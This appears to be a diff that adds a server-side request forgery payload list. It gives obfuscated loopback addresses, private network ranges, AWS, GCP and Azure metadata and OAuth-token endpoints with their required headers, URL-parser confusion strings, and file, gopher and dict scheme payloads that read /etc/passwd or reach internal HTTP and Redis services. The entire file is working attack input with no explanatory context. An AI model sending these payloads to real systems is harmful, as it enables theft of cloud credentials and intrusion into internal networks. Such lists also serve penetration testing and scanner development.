@@ -1,0 +1,32 @@
+# Loopback & variants
+http://127.0.0.1/
+http://127.0.0.1:80/
+http://localhost/
+http://127.1/
+http://0/
+http://2130706433/
+http://0x7f000001/
+http://[::1]/
+
+# Private networks
+http://10.0.0.1/
+http://192.168.0.1/
+http://172.16.0.1/
+
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+# Add header: Metadata-Flavor: Google
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+# Add header: Metadata: true
+
+# DNS/collaborator
+http://{{COLLAB}}/
+http://example.com@127.0.0.1/
+http://127.0.0.1#@example.com/
+
+# Other schemes (use with care)
+file:///etc/passwd
+gopher://127.0.0.1:80/_GET%20/%20HTTP/1.0%0D%0A%0D%0A
+ftp://127.0.0.1:21/
+dict://127.0.0.1:6379/info
